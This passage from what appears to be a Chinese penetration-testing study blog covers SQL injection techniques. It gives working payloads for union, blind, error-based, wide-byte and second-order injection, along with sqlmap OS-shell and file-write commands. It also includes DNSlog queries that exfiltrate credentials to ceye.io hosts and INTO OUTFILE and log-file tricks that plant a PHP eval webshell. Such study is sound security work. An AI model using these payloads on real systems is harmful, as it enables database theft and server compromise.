0,1)=0x59) THEN 1 ELSE 0 END),0x7171707071),NULL#[11:03:25] [DEBUG] performed 2 queries in 0.03 secondscurrent user is DBA: True 这个payload是可以学习的 --roles：列出数据库管理员角色 执行命令 运行自定义sql语句 运行--sql-shell 运行操作系统命令 --os-cmd，--os-shell：运行任意操作系统命令. 在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。 如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。 用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。 Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是–is-dba的值要为True)。 读取文件 该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot; 上传文件 --file-write --file-dest：上传文件到数据库服务器中。该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot; WAF绕过 WAF检测Ugent名单，使用sqlmap时可以加上参数–random agent（随机出现字母头），也可以自己设置 1--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot; sqlmap的速度过快，所以会被拦截，则添加延时参数 --delay参数 使用代理池，随机出IP，绕过IP白名单。或者自己设置代理：--proxy=http://127.0.0.1:8080 利用–tamper参数中的编码脚本 自己编写中转脚本","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","slug":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","date":"2023-05-24T06:22:40.000Z","updated":"2023-05-25T01:14:52.450Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-堆叠、二次、DNS注入、各位置注入等/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/","excerpt":"","text":"堆叠注入（可绕过select）用法参考advance 堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。 与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是有限的, 可以用来执行查询语句, 而堆叠注入可以执行的是任意的语句。 但是不同的数据库有不同的注入语句。 查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上 例子：修改数据：select * from user_test;update user_test set name='modify' where name='张三'; 注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入 宽字节注入 在mysql中，用于转义（即在字符串中的符号前加上\\）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性（会返回false）。 意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。 重点：%df%27 注意： 我们在之前介绍过“set names gbk”其实干了三件事，等同于：SET character set connection='gbk',haracter set results='gbk',character_set client='gbk'，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个character_set client=binary，那么就是不存在了。 字符集（宽） GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。 MySQL的字符集转换过程 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection; 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置） 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results。 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。 注入原理 GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’（单引号逃逸），有了单引号就好注入了。 也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。 1234$sql = &quot;select * from user where username=&#x27;$username&#x27;&quot;; payload:-1%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;table.name&#x27; # (后面的&#x27;&#x27;可以使用16进制编码，编码结束后在前面加上0x) 常见URL编码 URL编码 注释 %27 单引号 %20 空格 %23 #号 %5c /反斜杠 header改为gbk：header(&quot;Content-type:text/html;charset=gbk&quot;); 防御 使用mysql_set_charset(utf8)指定字符集 使用mysql_real_escape_string进行转义 这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法： 在执行查询之前先执行SET NAMES’gbk’,character_set_client=-binary设置character set client binary. 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。 使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。 二次编码注入 二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。 这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。 重点：%2527 URL编码 编码肯定是因为原始的格式并不适合传输才进行的，例如+，=，&amp;，;等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。 比如某登录场景：index.php?id=1$name=admin$pwd=123。账号密码中带有=号和&amp;号，就可能导致冲突，这些就需要进行url编码 比如： 编码前：name=admin= 编码后：name=admin%3d 通常后端程序会自动进行解码，比如php的urldecode()函数：urldecode('%3d') 二次编码 urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。 当输入id=1%27或者id=1’，都会被过滤（加上了\\） 当输入id=1%2527就可以让%25--&gt;%，所以合起来，就会变成%27，刚好能够注入。 二阶注入（二次注入） 示例是由：创建用户，登录和修改密码组成。 当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string） mysql_real_escape_string: 将转义特殊字符：\\x00, \\n, \\r, \\, ', &quot;, \\x1a 当我们注册的用户名为admin'#，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。 $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass'&quot;; 好文章，待会看： ZZCMS v8.3二阶注入：https://www.freebuf.com/vuls/183360.html ZoneMinder：https://www.4hou.com/info/news/19267.html Joomla3.8.2：https://blog.csdn.net/publicStr/article/details/80261667 二次注入漏洞挖掘：https://www.secpulse.com/archives/76506.html 二阶注入研究论文：http://www.doc88.com/p-6931153563831.html DNS注入（盲注DNSlog外带） 原理：首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下 原理 DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。 利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。 推荐平台：dnslog, admindnslog, ceye, BulidDNS 攻击 目标使用Mysql：SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\\\abc')); 前人的payload： ?id=1’ and if((select load_file(concat(’\\\\\\\\’,(select database()),’.sojcvo.ceye.io\\\\aaa’))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.sojcvo.ceye.io\\\\aaa'))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.sojcvo.ceye.io\\\\abc'))),1,0)-- + 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。 然后在ceye.io中看输出。 各位置注入 提交方式：get/post get只有一次传输 post传输头得到100 continue后再传data 注入类型：json/数字/字符串 注入点： Cookie Header：User-Agent（）可能存在有数据库的交互，记录在$_SERVER中","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-各种数据库的注入方式","slug":"SQL注入进阶-各种数据库的注入方式","date":"2023-05-23T10:24:39.000Z","updated":"2023-05-25T01:15:16.457Z","comments":true,"path":"articles/2023/05/23/SQL注入进阶-各种数据库的注入方式/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"介绍 什么决定网站注入点用户权限？数据库配置文件 常用数据库 常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql 非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。 判断sql注入数据库类型方法 如果可以，直接通过端口/默认语言判断 默认语言搭配数据库： 组合类型asp + access/mssql 组合类型php + mysql 组合类型aspx+mssql 组合类型jsp +mysql/oracle 组合类型Python + MongoDB 常见数据库的默认端口： 关系型数据库 mysql 3306 sqlserver 1433 oracle 1521 psotgresql 5432 非关系型数据库 MongoDB 27017 Redis 6379 memcached 11211 是否可以使用特定的函数来判断，该数据库特有的 在mssql中可以调用substring。oracle则只可调用substr mssql不可以调用version() 是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等 /*是MySQL中的注释符，返回错误说明该注入点不是MySQL； --是Oracle和MSSQL都支持的，但是;是Oracle不支持的，因为它不支持多行查询。 是否可以编码查询 是否显可以利用错误信息 例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。 是否存在数据库某些特性辅助判断 特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema) 参考：https://www.jianshu.com/p/e308d96e2ecd MYSQL 常见手法 找到注入点 and 1=1 and 1=2 测试报错 order by 5 # 到5的时候报错，获取字段总数为4 id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息 获取数据库信息 123user() ==&gt;rootdatabase() ==&gt;mozhe_Discuz_StormGroupversion() ==&gt;5.7.22-0ubuntu0.16.04.1 获取数据库表 12345table_name 表名information_schema.tables 系统生成信息表table_schema=数据库名16进制或者用单引号括起来# 改变limit 0,1中前一个参数，得到其他表 获取列名 脱库 信息搜集（前面提过） 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。 注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用user()进行查看，而且需要注意的是：不是root权限获取不到数据库名。 跨库查询、文件读写以及应用思路 跨库查询 1234567891011# 获取所有数据库名?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata # 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;# 跨库查列?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;# 查结果?id=-1 union select 1,u,p from qqyw.admin 文件读写 会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。 读取函数：load_file() 导出函数：into outfile 或into dumpfile 前提 应该设置--secure-file-priv 否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在secure-file-priv变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。 The MySQL server is running with the --secure-file-priv option so it cannot execute this statement。 应该对web目录需要有写权限，能够使用单引号 应该知道绝对路径 读取数据库路径：@@datadir 文件读取 只能读取绝对路径的网页文件 读取数据库路径：@@datadir 将绝对路径转换为16进制数时，不需要使用引号 语句： 1and 1=2 union select 1,load_file(&#x27;C:\\\\inetpub\\\\wwwroot\\\\mysql-sql\\\\inc\\\\set_sql.php&#x27;),3,4 然后在网页源码中查看 文件导出（写入到文件） 知道路径： 1?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot; 采用PHPmyadmin，选择一个数据库如test，在数据库中新创建一个表aa，在aa中插入一个数据&lt;?php @eval($_POST['123']);?&gt; 1id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+ 路径获取常见方法 报错显示：一般网站出现错误的时候它会泄露出路径； 遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出； 漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径； 平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径； 爆破； 魔术引号及常见保护 php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用GET，POST，cookie所接收的'单引号，&quot;双引号，\\反斜线和NULL字符全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。 编码或宽字节绕过 isset无法绕过，则替换关键字 宽字节绕过0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27，而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句 自定义关键字替换 其他绕过思路见其他文章 权限获取 数据库操作权限获取 提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法： 弱口令爆破 sqlmap注入的--sql-shell模式 进入交互界面后，通过select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码。 网站的数据库配置文件中拿到明文密码信息。文件名一般都有config CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 Webshell获取 into outfile 知道网站物理路径 高权限数据库用户 load_file()开启 即 secure_file_priv 无限制 可以通过这个查：mysql&gt; show global variables like '%secure_file_priv%'; 值 说明 NULL 不允许导入或导出 /tmp 只允许在/tmp操作 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 网站路径有写入权限 操作 select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;; 1232. ``` sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; 日志文件写 shell Web 文件夹宽松权限可以写入 Windows 系统下 高权限运行 MySQL 或者 Apache 日志设置查看： 12345678mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;general_loggeneral_log_file# 自定义set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/info.php&#x27;;# 往日志里面写入 payloadselect &#x27;&lt;?php phpinfo();?&gt;&#x27;; MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell： 注： 这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ： Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些 系统命令执行（提权【参考国光】） 查询HASH解密 1234# MySQL &lt;= 5.6 版本mysql&gt; select host, user, password from mysql.user;# MySQL &gt;= 5.7 版本mysql &gt; select host,user,authentication_string from mysql.user; 也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的： UDF提权 反弹端口提权 MOF提权 启动项提权 CVE-2016-6663/6664组合拳 低版本注入配合读取或暴力 小于5.0版本 字典或读取，爆破 ACCESS access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。 面对它只能暴力猜解，没有其他办法。 Access注入时，如果列名或者表名猜解不到的情况怎么办？ Access偏移注入：解决列名获取不到的情况。 and 1=2 报错找到注入点 order by 获取总字段 猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表 猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在 脱库 union select 1,username,passwd,4 from admin MSSQL and 1=2报错 order by N# 获取总字段 猜表名 and exists(select * from manage) 表名manage存在 猜解列名and exists(select id from manage)列名id存在 脱库and exists (select id from manage where id=1 )证明id=1存在 and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8 and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16 可用Burp的Intruder功能辅助猜解 猜解username第1到8位的字符，ASCII转码 admin_mz 猜解password第1到16位的字符，ASCII转码(Burp 爆破) 转ASCII的py脚本： 72e1bfc3f01b7583 MD5解密为97285101 常用参数 @@version，查询当前数据库版本 db_name()，查询当前数据库名称 user,system_user,current_user,user_name，查询当前用户 IS_SRVROLEMEMBER()，查询数据库权限。 @@SERVERNAME：获取有关服务器主机的信息 SQLite 找注入点 and 1=1 order by N 猜字段 4 猜数据库 offset ==&gt;0~2 有三个数据库： WSTMart_reg notice_sybase sqlite_sequence 猜列 共有3个字段： id,name,password 脱库 MongoDB id=1′ 单引号注入报错 闭合语句，查看所有集合 查看指定集合的数据 [0] 代表第一条数据，可递增 DB2 and 1=2 判断注入点 order by N 获取字段数 爆当前数据库：GAME_CHARACTER 列表：NAME 脱库 PostgreSQL and 1=2 判断注入点 order by N 获取字段 爆数据库 列表 列字段 脱库 Sybase数据库 and 1=2 判断注入点 order by N 获取总字段 爆数据库 列表 列字段 查状态：结果为：zhang 反选爆用户名：结果为：mozhe 猜解密码 Oracle and 1=1 order by 爆数据库 列表 列字段 脱库 加上状态：1 where STATUS=1 其他 小tips outfile 和 dumpfile的区别 outfile: 支持多行数据同时导出 使用union联合查询时，要保证两侧查询的列数相同 会在换行符制表符后面追加反斜杠 会在末尾追加换行 dumpfile: 每次只能导出一行数据 不会在换行符制表符后面追加反斜杠 不会在末尾追加换行 因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件；into outfile函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入基础","slug":"SQL注入基础","date":"2023-05-23T02:29:45.000Z","updated":"2023-05-25T01:14:36.391Z","comments":true,"path":"articles/2023/05/23/SQL注入基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"SQL注入基础 基础语法以及函数 基础 12345678910# 查询select * from news where id=$id# 更新update user set pwd=’$p’ where id=2 and username=‘admin’# 添加insert into users(id,url,text) values(2,‘x’,’$t’)# 删除delete from news where id=$id# order byselect id,name,price from news order by $order 其他 123456# 增加字段ALTER TABLE employees ADD phone varchar(20)# 权限控制(grant revoke)grant insert on grant_rights to unauthorized_user# 删表DROP TABLE users; 连接词、联合查询 **union：**联合查询 1select * from table where id = 1 union order by 3 join：连接查询（right/left join），如下搜索两个表相同的字段 1select * from users a join users b where a.id = b.id 注释以及其他符号 注释： 1234/* */ are inline comments-- , # are line commentsExample: SELECT * FROM users WHERE name = &#x27;admin&#x27; -- AND pass = &#x27;pass&#x27; 对于# url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用 所以在URL中使用#进行注入时应该将它转成url编码：%23 在POST请求中就不需要（需要验证） 对于--(空格) 一般在GET请求中，空格会直接被忽略，所以需要把他转化成--%20 还有另外一种方式，就是使用--+，这时候+号会被解释成空格 为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload 对于需要编码转码的#有用，因为只有一个字符，POST最好用这个，其他用--+ 堆叠查询： 123; allows query chainingExample: SELECT * FROM users; DROP TABLE users; 查询可用： 1234&#x27;,+,|| allows string concatenationChar() strings without quotesExample: SELECT * FROM users WHERE name = &#x27;+char(27) OR 1=1 注入原理以及危害 对于传入的搜索内容过滤不严，导致用户可以通过拼接SQL语句，对数据库进行操作。 以下情形均可能产生漏洞： 接收数据 拼接数据 数据库执行 结果展示 他会导致如下危害： 危害数据库里的数据 直接危害网站的权限 我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的 SQL 查询方式 基本注入 这里以mysql注入为例子 信息搜集 主要搜集： 123456789# 操作系统select @@version_compile_os# 数据库版本：select version()select @@version# 数据库名字：select database()# 数据库用户：select user() 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 小知识点： 问：一个@与两个@@有何区别？ 答：一个@是用户自定义变量，两个@是系统变量 手工注入 判断是否能注入，以及注入类型 先看是否输出信息：可以使用'、&quot; 和--+来测试 输出正确、错误与报错信息：都可以 输出正确、报错但不输出错误信息：布尔/时间盲注/报错注入 输出正确但不输出报错和错误信息：布尔/时间盲注 不输出任何信息：时间盲注 12# 或 且 非 三种逻辑判断符id=-1&#x27; and 1=1 判断有几个注入点：id=1' order by 3--+ 判断输出点有几个是可以回显的：id=1' union select 1,2,3 --+ 信息搜集： 获取数据库: 获取此时的数据库：id=-1' union select 1,2,database() --+ 获取全部数据库：id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 获取表名:id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查询其他数据库表名把database()换成'you_want' 获取列名：id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='you_want --+' 数据获取： 获取单个：id=-1' union select 1,2,[columnname] from [tablename] --+' 获取全部： id=-1' union select 1,2,group_concat([allcolumnname]) from [tablename]--+ -1' union select 1,2,(select concat_ws([column_name]) from [tbname]) --+ 闭合 常用闭合 1234567or 1=1--+ （数字型）&#x27; or 1=1--+ （字符型）&quot; or 1=1--+ （字符型）) or 1=1--+ （MySQL是允许嵌入多个括号的）&#x27;) or 1=1--+&quot;) or 1=1--+&quot;)) or 1=1--+ 非注释闭合 1234|| &#x27;or &#x27;&amp;&amp; &#x27;1&#x27;=&#x27;1;%00 报错and盲注 盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 基于布尔的 SQL 盲注-逻辑判断：regexp，like，ascii，left，ord，mid 基于时间的 SQL 盲注-延时判断：if，sleep 基于报错的 SQL 盲注-报错回显：floor，updatexml，extractvalue 对于报错注入，其payload可以安排在如下位置： 1234567&#x27;or（有效载荷）or&#x27;&#x27;and（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;=&#x27;&#x27;*（有效载荷）*&#x27;&#x27;or（有效载荷）and&#x27;“ - （有效载荷） - “ 参考： 123456789like ‘ro%’ #判断ro或ro…是否成立regexp ‘^xiaodi[1-z]’ #匹配xiaodi及xiaodi…等if(条件,5,0) #条件成立，返回5，反之，返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从B位置开始，截取字符串a的c长度left(database(),1),database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 涉及资源： 12种报错注入+万能语句 Order by排序注入方法小总结 Insert update 语句：insert into user(username,password) values('$username','$password',) floor：username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ' updatexml：username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or ' extractvalue：username=lwx’ or extractvalue(1,concat(0x7e,database())) or ' delete 在get中需要使用+号或者%20把语句连接起来，避免出错 floor：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1 updatexml：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) extractvalue：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1 布尔与延时盲注 布尔盲注 id=1' and left(version(),1)=5 --+ id=1' and length(database())=8--+ 延时盲注 id=1 and if((length(database()=8)),sleep(5),1)--+ id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+ 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement 。 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。 其他 基础概念 实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名 